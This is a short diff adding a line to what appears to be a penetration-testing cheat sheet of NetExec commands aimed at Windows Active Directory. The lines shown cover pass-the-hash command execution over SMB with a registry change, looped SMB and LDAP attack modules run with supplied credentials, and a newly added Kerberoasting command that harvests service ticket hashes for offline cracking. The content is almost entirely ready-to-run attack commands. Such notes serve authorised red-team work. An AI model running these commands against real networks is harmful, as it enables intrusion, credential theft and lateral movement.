@@ -73,3 +73,4 @@ nxc smb "$IP" -u "$USER" -H "$NT_HASH" --local-auth -x 'reg add HKLM\System\Curr
 proxychains nxc smb "$IP"
 for MODULE in $(cat smb.txt); do  nxc smb "$IP" -u "$USER" -p "$PASSWORD" -M $MODULE ; done
 for MODULE in $(cat ldap.txt); do  nxc ldap "$IP" -u "$USER" -p "$PASSWORD" -M $MODULE ; done
+nxc ldap "$IP" -u "$USER" -p "" --no-preauth-targets users.txt --kerberoasting Kerberoastables.txt
